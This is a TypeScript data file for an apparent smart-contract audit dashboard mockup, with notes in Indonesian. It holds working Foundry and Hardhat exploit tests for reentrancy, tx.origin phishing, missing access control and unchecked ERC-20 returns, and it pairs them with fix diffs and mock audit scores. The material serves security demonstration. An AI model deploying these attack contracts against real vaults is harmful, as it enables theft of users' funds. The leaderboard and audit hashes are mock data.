// suiteData.ts - Data, types, and utilities for the AI Security Suite (MOCKUP-LANJUTAN.html port)

export interface AttackStep {
  from: number;
  to: number;
  label: string;
  note: string;
  flag?: boolean;
  st: {
    a: string; // attacker balance
    v: string; // vault balance
    m: string; // mapping balance
  };
}

export interface AttackVector {
  id: string;
  sev: 'critical' | 'high' | 'medium' | 'low';
  name: string;
  target: string;
  swc: string;
  lanes: string[];
  steps: AttackStep[];
  foundry: string;
  hardhat: string;
  console: string[];
}

export const SEV_CHIP: Record<string, string> = {
  critical: 'border-crit/50 bg-crit/10 text-crit',
  high: 'border-orange-400/50 bg-orange-400/10 text-orange-400',
  medium: 'border-warn/50 bg-warn/10 text-warn',
  low: 'border-zinc-600 bg-zinc-700/40 text-zinc-300',
};

export const ATTACKS: AttackVector[] = [
  {
    id: 'reentrancy',
    sev: 'critical',
    name: 'Reentrancy Drain (DAO-style)',
    target: 'EtherVault.sol · withdraw()',
    swc: 'SWC-107',
    lanes: ['Attacker Contract', 'EtherVault.sol', 'State (balances)'],
    steps: [
      { from: 0, to: 1, label: 'deposit{value: 1 ETH}()', note: 'Attacker menyetor 1 ETH untuk mendapatkan saldo awal di balances.', st: { a: '1.00', v: '13.40', m: '1.00' } },
      { from: 1, to: 2, label: 'balances[attacker] = 1 ETH', note: 'State ledger diperbarui sesuai setoran.', st: { a: '1.00', v: '13.40', m: '1.00' } },
      { from: 0, to: 1, label: 'withdraw()', note: 'Attacker meminta penarikan dana.', st: { a: '1.00', v: '13.40', m: '1.00' } },
      { from: 1, to: 2, label: 'uint bal = balances[attacker]', note: 'Membaca saldo sebelum external call.', st: { a: '1.00', v: '13.40', m: '1.00' } },
      { from: 1, to: 0, label: 'msg.sender.call{value: 1}()', note: 'Mentransfer ETH ke attacker SEBELUM mengurangi balances! ⚠', flag: true, st: { a: '1.99', v: '12.40', m: '1.00' } },
      { from: 0, to: 1, label: 'receive() → vault.withdraw()', note: 'Fallback attacker memanggil kembali withdraw() sebelum eksekusi pertama selesai.', flag: true, st: { a: '2.99', v: '11.40', m: '1.00' } },
      { from: 1, to: 2, label: 'balances[attacker] = 0', note: 'State baru dinolkan SETELAH seluruh loop callback selesai (terlambat!).', flag: true, st: { a: '13.39', v: '0.01', m: '0.00' } },
      { from: 0, to: 0, label: 'Attacker untung bersih +12.39 ETH', note: 'Seluruh saldo likuiditas vault berhasil dikuras dalam satu transaksi atomik.', flag: true, st: { a: '13.39', v: '0.01', m: '0.00' } }
    ],
    foundry: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {Test, console2} from "forge-std/Test.sol";
import {EtherVault} from "../src/EtherVault.sol";

contract AttackContract {
    EtherVault public vault;
    uint256 public count;

    constructor(address _v) { vault = EtherVault(_v); }

    function attack() external payable {
        vault.deposit{value: 1 ether}();
        vault.withdraw();
    }

    receive() external payable {
        if (address(vault).balance >= 1 ether && count < 12) {
            count++;
            vault.withdraw(); // ⚠ reentrant invocation
        }
    }
}

contract ReentrancyExploitTest is Test {
    EtherVault vault;
    AttackContract attacker;
    address victim = makeAddr("victim");

    function setUp() public {
        vault = new EtherVault();
        vm.deal(victim, 12.4 ether);
        vm.prank(victim);
        vault.deposit{value: 12.4 ether}();

        attacker = new AttackContract(address(vault));
        vm.deal(address(attacker), 1 ether);
    }

    function testExploit() public {
        console2.log("Vault balance sebelum :", address(vault).balance / 1e18);
        attacker.attack();
        console2.log("Vault balance sesudah :", address(vault).balance / 1e18);
        console2.log("Attacker untung bersih:", address(attacker).balance / 1e18 - 1);

        assertLt(address(vault).balance, 1 ether, "Vault harusnya terkuras habis");
    }
}`,
    hardhat: `// test/reentrancy.ts
import { expect } from "chai";
import { ethers } from "hardhat";

describe("EtherVault :: Reentrancy Exploit", function () {
  it("dapat menguras vault via reentrant receive()", async function () {
    const [victim, evil] = await ethers.getSigners();

    const Vault = await ethers.getContractFactory("EtherVault");
    const vault = await Vault.deploy();

    await vault.connect(victim).deposit({ value: ethers.parseEther("12.4") });

    const Attacker = await ethers.getContractFactory("AttackContract");
    const attacker = await Attacker.connect(evil).deploy(await vault.getAddress());

    await attacker.connect(evil).attack({ value: ethers.parseEther("1.0") });

    const vaultBal = await ethers.provider.getBalance(await vault.getAddress());
    expect(vaultBal).to.be.lt(ethers.parseEther("1.0"));
  });
});`,
    console: [
      '$ forge test --match-test testExploit -vvv',
      '[⠊] Compiling 2 files with 0.8.19',
      '[⠒] Solc 0.8.19 finished in 842.11ms',
      'Compiler run successful!',
      '',
      'Running 1 test for test/ReentrancyExploitTest.t.sol:ReentrancyExploitTest',
      '<span class="text-safe">[PASS]</span> testExploit() (gas: 421_884)',
      'Logs:',
      '  Vault balance sebelum : 12',
      '  Vault balance sesudah : 0',
      '  Attacker untung bersih: 12',
      '',
      'Traces:',
      '  <span class="text-cyber">[421884]</span> ReentrancyExploitTest::testExploit()',
      '    ├─ <span class="text-cyber">[392811]</span> AttackContract::attack{value: 1000000000000000000}()',
      '    │   ├─ <span class="text-cyber">[21450]</span> EtherVault::deposit{value: 1000000000000000000}()',
      '    │   ├─ <span class="text-crit">[352109]</span> EtherVault::withdraw()',
      '    │   │   ├─ <span class="text-crit">[312891]</span> AttackContract::receive{value: 1000000000000000000}()',
      '    │   │   │   └─ <span class="text-crit">EtherVault::withdraw()  [REENTRANT CALL × 12]</span>',
      '    │   │   └─ ← [Return]',
      '    │   └─ ← [Return]',
      '    └─ ← [Stop]',
      '',
      'Suite result: <span class="text-safe">ok</span>. 1 passed; 0 failed; 0 skipped; finished in 2.14ms',
      '<span class="text-crit">⚠ EXPLOIT CONFIRMED — Dana terkuras tanpa otorisasi!</span>'
    ]
  },
  {
    id: 'origin',
    sev: 'critical',
    name: 'Phishing via tx.origin Auth',
    target: 'EtherVault.sol · emergencyWithdraw()',
    swc: 'SWC-115',
    lanes: ['Owner (Victim)', 'Phishing DApp', 'EtherVault (target)'],
    steps: [
      { from: 0, to: 1, label: 'claimAirdrop() (klik link jebakan)', note: 'Owner tertipu membuka situs phishing berkedok klaim airdrop token BOT.', st: { a: '0.00', v: '12.40', m: '—' } },
      { from: 1, to: 2, label: 'vault.emergencyWithdraw(attacker)', note: 'Kontrak jahat meneruskan call ke vault milik korban.', flag: true, st: { a: '0.00', v: '12.40', m: '—' } },
      { from: 2, to: 2, label: 'require(tx.origin == owner)', note: '⚠ tx.origin adalah Owner korban, BUKAN msg.sender (PhishingDapp). Cek lolos!', flag: true, st: { a: '0.00', v: '12.40', m: '—' } },
      { from: 2, to: 1, label: 'transfer(all balance) ke attacker', note: 'Vault mentransfer seluruh 12.4 ETH ke dompet penyerang.', flag: true, st: { a: '12.40', v: '0.00', m: '—' } },
      { from: 1, to: 0, label: 'revert("airdrop failed")', note: 'DApp menampilkan error palsu agar korban tidak sadar telah dirampok.', st: { a: '12.40', v: '0.00', m: '—' } }
    ],
    foundry: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Test, console2} from "forge-std/Test.sol";
import {EtherVault} from "../src/EtherVault.sol";

contract PhishingDapp {
    EtherVault vault;
    address payable attacker;
    constructor(address _v, address payable _a) { vault = EtherVault(_v); attacker = _a; }

    function claimAirdrop() external {
        vault.emergencyWithdraw(attacker); // ⚠ tx.origin tetap victim!
    }
}

contract TxOriginExploitTest is Test {
    EtherVault vault;
    PhishingDapp phish;
    address owner    = makeAddr("owner");
    address attacker = makeAddr("attacker");

    function setUp() public {
        vm.prank(owner);
        vault = new EtherVault();
        vm.deal(address(vault), 12.4 ether);
        phish = new PhishingDapp(address(vault), payable(attacker));
    }

    function testExploit() public {
        vm.prank(owner, owner); // msg.sender = owner, tx.origin = owner
        phish.claimAirdrop();

        assertEq(address(vault).balance, 0, "Vault harusnya kosong");
        assertEq(attacker.balance, 12.4 ether, "Attacker menerima seluruh dana");
    }
}`,
    hardhat: `// test/txOrigin.ts
import { expect } from "chai";
import { ethers } from "hardhat";

describe("EtherVault :: tx.origin phishing", function () {
  it("menguras emergencyWithdraw via phishing contract", async function () {
    const [owner, attacker] = await ethers.getSigners();
    const Vault = await ethers.getContractFactory("EtherVault");
    const vault = await Vault.connect(owner).deploy();

    await owner.sendTransaction({ to: await vault.getAddress(), value: ethers.parseEther("12.4") });

    const Phish = await ethers.getContractFactory("PhishingDapp");
    const phish = await Phish.connect(attacker).deploy(await vault.getAddress(), attacker.address);

    await phish.connect(owner).claimAirdrop();

    expect(await ethers.provider.getBalance(attacker.address)).to.be.gt(ethers.parseEther("12.3"));
    expect(await ethers.provider.getBalance(await vault.getAddress())).to.equal(0n);
  });
});`,
    console: [
      '$ forge test --match-test testExploit -vvv  (TxOriginExploitTest)',
      '<span class="text-safe">[PASS]</span> testExploit() (gas: 96_412)',
      'Logs:',
      '  attacker balance: 12400000000000000000',
      '  vault balance   : 0',
      '',
      'Traces:',
      '  <span class="text-cyber">[8411]</span> PhishingDapp::claimAirdrop()',
      '    └─ <span class="text-cyber">[5210]</span> EtherVault::emergencyWithdraw(0xattacker)',
      '       ├─ require(tx.origin == owner) → <span class="text-crit">true (FLAWED)</span>',
      '       └─ <span class="text-crit">address.transfer(12400000000000000000)</span>',
      '',
      '<span class="text-crit">⚠ EXPLOIT CONFIRMED — full vault drained via tx.origin auth</span>'
    ]
  },
  {
    id: 'access',
    sev: 'high',
    name: 'Access-Control Takeover',
    target: 'TokenRegistry.sol · verifyToken()',
    swc: 'SWC-105',
    lanes: ['Attacker', 'TokenRegistry', 'Frontend / Users'],
    steps: [
      { from: 0, to: 1, label: 'registry.register(scamToken, "USDT", "USDT")', note: 'Siapa pun boleh mendaftarkan token (berbayar fee).', st: { a: '0.00', v: '—', m: '0 verified' } },
      { from: 0, to: 1, label: 'registry.verifyToken(scamToken)', note: '⚠ Tidak ada modifier onlyAdmin — panggilan lolos.', flag: true, st: { a: '0.00', v: '—', m: '0 verified' } },
      { from: 1, to: 1, label: 'tokens[scam].verified = true', note: 'Status verifikasi dipalsukan oleh attacker.', flag: true, st: { a: '0.00', v: '—', m: '1 verified' } },
      { from: 2, to: 1, label: 'frontend membaca tokens(x).verified', note: 'UI menampilkan badge "✓ Official Verified".', st: { a: '0.00', v: '—', m: '1 verified' } },
      { from: 2, to: 0, label: 'users mentransfer dana ke token scam', note: 'Kerugian massal akibat trust anchor palsu.', flag: true, st: { a: '+ rug proceeds', v: '—', m: '1 verified' } }
    ],
    foundry: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Test, console2} from "forge-std/Test.sol";
import {TokenRegistry} from "../src/TokenRegistry.sol";

contract AccessControlExploitTest is Test {
    TokenRegistry registry;
    address attacker = makeAddr("attacker");
    address scam     = makeAddr("scamToken");

    function setUp() public {
        registry = new TokenRegistry();
        vm.deal(attacker, 1 ether);
    }

    function testExploit() public {
        vm.startPrank(attacker);
        registry.register{value: 0.01 ether}(scam, "Tether USD", "USDT");
        registry.verifyToken(scam);
        vm.stopPrank();

        (,,,bool verified) = registry.tokens(scam);
        console2.log("verified flag:", verified);
        assertTrue(verified, "attacker seharusnya tidak bisa memverifikasi token");
    }
}`,
    hardhat: `// test/accessControl.ts
import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenRegistry :: missing access control", function () {
  it("attacker dapat memverifikasi token scam", async function () {
    const [, attacker, scam] = await ethers.getSigners();
    const Registry = await ethers.getContractFactory("TokenRegistry");
    const registry = await Registry.deploy();

    await registry.connect(attacker).register(scam.address, "Tether USD", "USDT",
      { value: ethers.parseEther("0.01") });
    await registry.connect(attacker).verifyToken(scam.address);

    const t = await registry.tokens(scam.address);
    expect(t.verified).to.equal(true);
  });
});`,
    console: [
      '$ forge test --match-contract AccessControlExploitTest -vvv',
      '<span class="text-safe">[PASS]</span> testExploit() (gas: 118_204)',
      'Logs:',
      '  verified flag: true',
      '',
      '<span class="text-crit">⚠ EXPLOIT CONFIRMED — verifikasi badge dapat dipalsukan publik</span>',
      '  Dampak: phishing listing, false trust anchor, potensi rug massal.'
    ]
  },
  {
    id: 'erc20',
    sev: 'medium',
    name: 'Unchecked ERC-20 Return',
    target: 'TokenRegistry.sol · bulkTransfer()',
    swc: 'SWC-104',
    lanes: ['Treasury', 'TokenRegistry', 'USDT-like Token'],
    steps: [
      { from: 0, to: 1, label: 'registry.bulkTransfer(token, tos, amts)', note: 'Distribusi batch ke 3 penerima.', st: { a: '1,000', v: '—', m: '—' } },
      { from: 1, to: 2, label: 'IERC20(token).transfer(to[0], amt[0])', note: 'Token non-standard mengembalikan false tanpa revert.', st: { a: '1,000', v: '—', m: '—' } },
      { from: 2, to: 1, label: 'return false  (silent failure)', note: '⚠ Return value tidak diperiksa — kegagalan tak terdeteksi.', flag: true, st: { a: '1,000', v: '—', m: '—' } },
      { from: 1, to: 2, label: 'loop berlanjut ke to[1], to[2]…', note: 'State internal tetap mencatat distribusi sukses.', st: { a: '1,000', v: '—', m: '—' } },
      { from: 1, to: 0, label: 'accounting mismatch terakumulasi', note: 'Ledger ≠ saldo riil; selisih dapat dieksploitasi.', flag: true, st: { a: '1,000 (stale)', v: '—', m: '—' } }
    ],
    foundry: `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;
import {Test, console2} from "forge-std/Test.sol";
import {TokenRegistry} from "../src/TokenRegistry.sol";

contract SilentToken {
    mapping(address => uint256) public balanceOf;
    function mint(address a, uint256 v) external { balanceOf[a] += v; }
    function transfer(address, uint256) external pure returns (bool) { return false; }
}

contract UncheckedReturnTest is Test {
    TokenRegistry registry; SilentToken token;
    address treasury = makeAddr("treasury");

    function setUp() public {
        registry = new TokenRegistry();
        token    = new SilentToken();
        token.mint(address(registry), 1000e18);
    }

    function testExploit() public {
        address[] memory to  = new address[](2);
        uint256[] memory amt = new uint256[](2);
        to[0] = makeAddr("a"); to[1] = makeAddr("b");
        amt[0] = 100e18; amt[1] = 100e18;

        vm.prank(treasury);
        registry.bulkTransfer(address(token), to, amt);

        console2.log("registry balance tetap:", token.balanceOf(address(registry)) / 1e18);
        assertEq(token.balanceOf(address(registry)), 1000e18, "transfer gagal tapi tidak terdeteksi");
    }
}`,
    hardhat: `// test/uncheckedReturn.ts
import { expect } from "chai";
import { ethers } from "hardhat";

describe("TokenRegistry :: unchecked ERC-20 return", function () {
  it("transfer gagal (return false) tanpa revert", async function () {
    const [treasury, a, b] = await ethers.getSigners();
    const Registry = await ethers.getContractFactory("TokenRegistry");
    const Token    = await ethers.getContractFactory("SilentToken");
    const registry = await Registry.deploy();
    const token    = await Token.deploy();

    await token.mint(await registry.getAddress(), ethers.parseEther("1000"));
    await registry.connect(treasury).bulkTransfer(
      await token.getAddress(), [a.address, b.address],
      [ethers.parseEther("100"), ethers.parseEther("100")]
    );

    expect(await token.balanceOf(await registry.getAddress())).to.equal(ethers.parseEther("1000"));
  });
});`,
    console: [
      '$ forge test --match-contract UncheckedReturnTest -vvv',
      '<span class="text-safe">[PASS]</span> testExploit() (gas: 88_120)',
      'Logs:',
      '  registry balance tetap: 1000',
      '',
      '<span class="text-warn">⚠ SILENT FAILURE CONFIRMED — ledger tidak sinkron dengan saldo riil</span>',
      '  Fix: SafeERC20.safeTransfer() atau require(token.transfer(...), "TF").'
    ]
  }
];

export interface PatchItem {
  id: string;
  title: string;
  sev: 'critical' | 'high' | 'medium' | 'low';
  delta: number;
  fixes: string;
  desc: string;
}

export const PATCHES: PatchItem[] = [
  { id: 'guard', title: 'Pasang ReentrancyGuard + CEI', sev: 'critical', delta: 28, fixes: 'Reentrancy pada withdraw()',
    desc: 'Import OpenZeppelin ReentrancyGuard, tambahkan modifier nonReentrant, dan pindahkan state update sebelum external call.' },
  { id: 'origin', title: 'Ganti tx.origin → msg.sender (Ownable)', sev: 'critical', delta: 18, fixes: 'tx.origin authentication',
    desc: 'Warisi Ownable, gunakan onlyOwner, dan hapus seluruh pemakaian tx.origin.' },
  { id: 'access', title: 'Tambah access control pada setter', sev: 'high', delta: 16, fixes: 'setOwner() tanpa otoritas',
    desc: 'Batasi fungsi sensitif dengan onlyOwner + emit OwnershipTransferred.' },
  { id: 'safeerc', title: 'Upgrade ke SafeERC20 / cek return value', sev: 'medium', delta: 8, fixes: 'Unchecked ERC-20 transfer',
    desc: 'Gunakan safeTransfer & validasi zero-address sebelum state write.' },
  { id: 'events', title: 'Emit events + custom errors', sev: 'low', delta: 6, fixes: 'Silent state change & gas waste',
    desc: 'Tambahkan event Deposited/Withdrawn dan custom error untuk menghemat ±60 gas per revert.' }
];

export interface DiffEntry {
  t: 'ctx' | 'del' | 'add' | 'blank';
  p?: string;
  s?: string;
}

export const DIFF: DiffEntry[] = [
  { t: 'ctx', s: '// SPDX-License-Identifier: MIT' },
  { t: 'del', p: 'guard', s: 'pragma solidity ^0.8.19;' },
  { t: 'add', p: 'guard', s: 'pragma solidity ^0.8.24;' },
  { t: 'blank' },
  { t: 'add', p: 'origin', s: 'import {Ownable} from "@openzeppelin/contracts/access/Ownable.sol";' },
  { t: 'add', p: 'guard', s: 'import {ReentrancyGuard} from "@openzeppelin/contracts/utils/ReentrancyGuard.sol";' },
  { t: 'add', p: 'safeerc', s: 'import {SafeERC20, IERC20} from "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";' },
  { t: 'add', p: 'origin', s: 'import {console} from "forge-std/console.sol";' },
  { t: 'blank' },
  { t: 'del', p: 'origin', s: '/// @title EtherVault — INSECURE DEMO (vibe-coded)' },
  { t: 'add', p: 'origin', s: '/// @title EtherVault — AI-patched with VibeProof' },
  { t: 'add', p: 'origin', s: '/// @notice ReentrancyGuard + Ownable + checks-effects-interactions' },
  { t: 'del', p: 'origin', s: 'contract EtherVault {' },
  { t: 'add', p: 'origin', s: 'contract EtherVault is Ownable, ReentrancyGuard {' },
  { t: 'add', p: 'safeerc', s: '    using SafeERC20 for IERC20;' },
  { t: 'ctx', s: '    mapping(address => uint256) public balances;' },
  { t: 'del', p: 'origin', s: '    address public owner;' },
  { t: 'blank' },
  { t: 'del', p: 'events', s: '    constructor() {' },
  { t: 'add', p: 'events', s: '    event Deposited(address indexed user, uint256 amount);' },
  { t: 'add', p: 'events', s: '    event Withdrawn(address indexed user, uint256 amount);' },
  { t: 'add', p: 'events', s: '    event EmergencyDrain(address indexed to, uint256 amount);' },
  { t: 'add', p: 'events', s: '    error ZeroAmount();' },
  { t: 'add', p: 'events', s: '    error TransferFailed();' },
  { t: 'blank' },
  { t: 'del', p: 'origin', s: '        owner = tx.origin;' },
  { t: 'add', p: 'origin', s: '    constructor() Ownable(msg.sender) {}' },
  { t: 'ctx', s: '    }' },
  { t: 'blank' },
  { t: 'del', p: 'events', s: '    function deposit() external payable {' },
  { t: 'add', p: 'events', s: '    function deposit() external payable nonReentrant {' },
  { t: 'ctx', s: '        balances[msg.sender] += msg.value;' },
  { t: 'add', p: 'events', s: '        emit Deposited(msg.sender, msg.value);' },
  { t: 'ctx', s: '    }' },
  { t: 'blank' },
  { t: 'del', p: 'guard', s: '    function withdraw() external {' },
  { t: 'add', p: 'guard', s: '    function withdraw() external nonReentrant {' },
  { t: 'ctx', s: '        uint256 bal = balances[msg.sender];' },
  { t: 'del', p: 'events', s: '        require(bal > 0, "No funds");' },
  { t: 'add', p: 'events', s: '        if (bal == 0) revert ZeroAmount();' },
  { t: 'blank' },
  { t: 'add', p: 'guard', s: '        // ✔ EFFECTS sebelum INTERACTIONS (checks-effects-interactions)' },
  { t: 'add', p: 'guard', s: '        balances[msg.sender] = 0;' },
  { t: 'del', p: 'guard', s: '        (bool ok, ) = msg.sender.call{value: bal}("");' },
  { t: 'del', p: 'events', s: '        require(ok, "Transfer failed");' },
  { t: 'add', p: 'guard', s: '        (bool ok, ) = msg.sender.call{value: bal}("");' },
  { t: 'add', p: 'events', s: '        if (!ok) revert TransferFailed();' },
  { t: 'add', p: 'events', s: '        emit Withdrawn(msg.sender, bal);' },
  { t: 'blank' },
  { t: 'del', p: 'guard', s: '        balances[msg.sender] = 0;' },
  { t: 'ctx', s: '    }' },
  { t: 'blank' },
  { t: 'del', p: 'origin', s: '    function emergencyWithdraw(address payable _to) public {' },
  { t: 'add', p: 'origin', s: '    function emergencyWithdraw(address payable _to) external onlyOwner nonReentrant {' },
  { t: 'del', p: 'origin', s: '        require(tx.origin == owner, "Not owner");' },
  { t: 'add', p: 'safeerc', s: '        require(_to != address(0), "zero address");' },
  { t: 'ctx', s: '        _to.transfer(address(this).balance);' },
  { t: 'add', p: 'events', s: '        emit EmergencyDrain(_to, address(this).balance);' },
  { t: 'ctx', s: '    }' },
  { t: 'blank' },
  { t: 'del', p: 'access', s: '    function setOwner(address _new) external {' },
  { t: 'add', p: 'access', s: '    function setOwner(address _new) external onlyOwner {' },
  { t: 'add', p: 'access', s: '        require(_new != address(0), "zero address");' },
  { t: 'ctx', s: '        owner = _new;' },
  { t: 'add', p: 'access', s: '        emit OwnershipTransferred(owner, _new);' },
  { t: 'ctx', s: '    }' },
  { t: 'blank' },
  { t: 'ctx', s: '    receive() external payable {' },
  { t: 'ctx', s: '        balances[msg.sender] += msg.value;' },
  { t: 'ctx', s: '    }' },
  { t: 'ctx', s: '}' }
];

export interface LeaderboardItem {
  n: string;
  cat: 'DeFi' | 'Bridge' | 'NFT' | 'Gaming' | 'Infra';
  score: number;
  aud: 'certified' | 'warning' | 'critical' | 'unaudited';
  tvl: string;
  d: number;
}

export const LB: LeaderboardItem[] = [
  { n: 'AstroSwap DEX', cat: 'DeFi', score: 96, aud: 'certified', tvl: '48.2M BOT', d: 2.1 },
  { n: 'BotLend Markets', cat: 'DeFi', score: 92, aud: 'certified', tvl: '31.7M BOT', d: 1.4 },
  { n: 'Nebula Bridge', cat: 'Bridge', score: 88, aud: 'certified', tvl: '22.4M BOT', d: 0.6 },
  { n: 'PixelPets NFT', cat: 'NFT', score: 94, aud: 'certified', tvl: '4.1M BOT', d: 3.2 },
  { n: 'YieldRouter V2', cat: 'DeFi', score: 54, aud: 'warning', tvl: '9.8M BOT', d: -4.8 },
  { n: 'BotArena Gaming', cat: 'Gaming', score: 83, aud: 'certified', tvl: '6.3M BOT', d: 0.9 },
  { n: 'MetaPay Wallet', cat: 'Infra', score: 89, aud: 'certified', tvl: '12.9M BOT', d: 1.1 },
  { n: 'FlashLoanPool', cat: 'DeFi', score: 35, aud: 'critical', tvl: '7.6M BOT', d: -9.4 },
  { n: 'Genesis Pass NFT', cat: 'NFT', score: 38, aud: 'unaudited', tvl: '1.2M BOT', d: -6.1 },
  { n: 'GovBridge DAO', cat: 'Bridge', score: 91, aud: 'certified', tvl: '18.5M BOT', d: 2.7 },
  { n: 'StableSwap AMM', cat: 'DeFi', score: 69, aud: 'warning', tvl: '15.3M BOT', d: -1.2 },
  { n: 'OracleAggregator', cat: 'Infra', score: 90, aud: 'certified', tvl: '—', d: 0.4 },
  { n: 'PresaleVault', cat: 'DeFi', score: 22, aud: 'critical', tvl: '3.4M BOT', d: -12.6 },
  { n: 'AirdropClaimer', cat: 'Gaming', score: 87, aud: 'certified', tvl: '0.9M BOT', d: 1.8 }
];

export const AUDIT_CHIP: Record<string, string> = {
  certified: 'border-safe/50 bg-safe/10 text-safe',
  warning: 'border-warn/50 bg-warn/10 text-warn',
  critical: 'border-crit/50 bg-crit/10 text-crit',
  unaudited: 'border-zinc-600 bg-zinc-700/40 text-zinc-400',
};

export const AUDIT_LABEL: Record<string, string> = {
  certified: 'CERTIFIED SAFE',
  warning: 'WARNINGS',
  critical: 'CRITICAL',
  unaudited: 'UNAUDITED'
};

export const WATCH_NAMES = [
  'AirdropDistributor', 'LiquidStakingPool', 'NftMarketplace', 'PerpVault',
  'BridgeMessenger', 'RewardEscrow', 'GovernorBravo', 'MemeLauncher',
  'StablePool', 'ZkVerifier', 'LootboxRandom', 'FeeCollector'
];

export const WATCH_STATUS = [
  { k: 'unverified', label: 'Unverified Bytecode', chip: 'border-zinc-600 bg-zinc-700/40 text-zinc-400' },
  { k: 'pending', label: 'Pending VibeProof Audit', chip: 'border-warn/50 bg-warn/10 text-warn' },
  { k: 'safe', label: 'Certified Safe', chip: 'border-safe/50 bg-safe/10 text-safe' },
  { k: 'crit', label: 'Critical Risk Detected', chip: 'border-crit/50 bg-crit/10 text-crit' }
];

export interface ProofItem {
  name: string;
  score: number;
  summary: string;
  findings: [string, string, string, string][]; // [sev, title, line, remediation]
  hash: string;
  tx: string;
  block: number;
  auditor: string;
  min: number;
}

export const PROOFS: ProofItem[] = [
  {
    name: 'SafeDAppVault.sol',
    score: 96,
    summary: 'ReentrancyGuard + checks-effects-interactions diterapkan konsisten, akses administratif dibatasi Ownable, dan seluruh interaksi token memakai SafeERC20. Tidak ditemukan vektor eksploitasi langsung.',
    findings: [['Low', '_pricePerShare() mengandalkan balanceOf() token', '59', 'Gunakan accumulator internal / oracle independen']],
    hash: '0x9a83f4b009e840d892837bcde20a16fc8b9910d80c3b0185e7839401726a4b11',
    tx: '0xd048b10884d334e405a9632a9390ad6cf83751296bf3bc5949d03158c8faef44',
    block: 3412700,
    auditor: '0x38bF4d01c9aE77e5b021Ff6cD81a20A4',
    min: 61
  },
  {
    name: 'GovBridge.sol',
    score: 92,
    summary: 'Multisig threshold tepat dan message replay protection lengkap. Disarankan menambahkan timelock untuk seluruh operasi upgrade.',
    findings: [
      ['Medium', 'Upgrade tanpa timelock', '88', 'Tambahkan TimelockController 48 jam'],
      ['Low', 'Event signature tidak indexed', '104', 'Index parameter address agar ter-filter murah']
    ],
    hash: '0x81fa940e7cb8201ea918db40156d837c7849e89b21a8d940e572049b10d7a049',
    tx: '0x94b0a1f0a10984cfb4890c0183b0572b8401e858db194a08157c195f190e84b7',
    block: 3412460,
    auditor: '0x38bF4d01c9aE77e5b021Ff6cD81a20A4',
    min: 480
  },
  {
    name: 'TokenRegistry.sol',
    score: 58,
    summary: 'verifyToken() terbuka untuk siapa pun sehingga badge verifikasi dapat dipalsukan. Return value ERC-20 tidak diverifikasi dan loop batch tidak dibatasi.',
    findings: [
      ['High', 'Missing access control verifyToken()', '26', 'Tambahkan modifier onlyAdmin'],
      ['Medium', 'Unchecked ERC-20 return value', '40', 'Gunakan SafeERC20.safeTransfer'],
      ['Medium', 'Unbounded loop (DoS gas)', '39', 'Batasi panjang batch / pull-payment']
    ],
    hash: '0x49c81b0a5789d041e8c09182371940183a90184b29d817498c01948b8192a014',
    tx: '0x3108c9018d9418293751a084618d0918c50198427189d019385b0184918e90a2',
    block: 3411980,
    auditor: '0x9aC177b0eF44c2A5d1B8031f77e09c77',
    min: 22
  },
  {
    name: 'VulnerableVault.sol',
    score: 28,
    summary: 'Kontrak dapat dikuras sepenuhnya melalui reentrancy pada withdraw(). Autentikasi tx.origin membuka phishing front-running dan setOwner() tanpa access control memungkinkan takeover.',
    findings: [
      ['Critical', 'Reentrancy — external call sebelum state update', '21', 'ReentrancyGuard + checks-effects-interactions'],
      ['Critical', 'tx.origin authentication', '28', 'Ganti msg.sender + onlyOwner'],
      ['High', 'setOwner() tanpa access control', '32', 'Modifier onlyOwner + event'],
      ['Medium', 'Tidak ada event deposit/withdraw', '13', 'Emit event untuk audit trail']
    ],
    hash: '0xe8371948b8192a0149a83f4b009e840d892837bcde20a16fc8b9910d80c3b018',
    tx: '0x17c0a9184918e90a294b0a1f0a10984cfb4890c0183b0572b8401e858db194a0',
    block: 3412840,
    auditor: '0x38bF4d01c9aE77e5b021Ff6cD81a20A4',
    min: 4
  }
];

export interface RepoFile {
  p: string;
  loc: number;
  score: number | null;
  inherits: string[];
  calls: string[];
  scanned?: boolean;
  sel?: boolean;
}

export const REPOS: Record<string, RepoFile[]> = {
  'defi-vault-foundry': [
    { p: 'src/EtherVault.sol', loc: 39, score: 28, inherits: ['ReentrancyGuard', 'Ownable'], calls: ['IERC20.transfer'] },
    { p: 'src/RewardToken.sol', loc: 112, score: 88, inherits: ['ERC20', 'Ownable'], calls: [] },
    { p: 'src/StakingRewards.sol', loc: 184, score: 61, inherits: ['ReentrancyGuard'], calls: ['RewardToken.mint', 'EtherVault.deposit'] },
    { p: 'src/interfaces/IERC20.sol', loc: 14, score: 99, inherits: [], calls: [] },
    { p: 'lib/openzeppelin/Ownable.sol', loc: 88, score: 99, inherits: ['Context'], calls: [] },
    { p: 'lib/openzeppelin/ERC20.sol', loc: 246, score: 97, inherits: ['IERC20', 'Context'], calls: [] },
    { p: 'test/EtherVault.t.sol', loc: 96, score: null, inherits: ['Test'], calls: ['EtherVault.withdraw'] }
  ],
  'nft-minting-hardhat': [
    { p: 'contracts/GenesisPass.sol', loc: 148, score: 38, inherits: ['ERC721', 'Ownable'], calls: [] },
    { p: 'contracts/MerkleWhitelist.sol', loc: 64, score: 91, inherits: [], calls: [] },
    { p: 'contracts/RoyaltySplitter.sol', loc: 52, score: 74, inherits: ['Ownable'], calls: ['GenesisPass.owner'] },
    { p: 'contracts/interfaces/IERC2981.sol', loc: 11, score: 99, inherits: [], calls: [] }
  ],
  'cross-chain-bridge': [
    { p: 'src/BridgeMessenger.sol', loc: 210, score: 54, inherits: ['Ownable', 'ReentrancyGuard'], calls: ['OracleAggregator.latestAnswer'] },
    { p: 'src/OracleAggregator.sol', loc: 96, score: 90, inherits: ['Ownable'], calls: [] },
    { p: 'src/TokenLocker.sol', loc: 78, score: 83, inherits: ['SafeERC20'], calls: ['IERC20.transfer'] }
  ]
};

export interface GraphNode {
  id: string;
  x: number;
  y: number;
  kind: 'core' | 'oz' | 'iface';
}

export const GRAPH_LAYOUT: Record<string, GraphNode[]> = {
  'defi-vault-foundry': [
    { id: 'EtherVault', x: 120, y: 80, kind: 'core' },
    { id: 'StakingRewards', x: 380, y: 210, kind: 'core' },
    { id: 'RewardToken', x: 640, y: 80, kind: 'core' },
    { id: 'Ownable', x: 120, y: 330, kind: 'oz' },
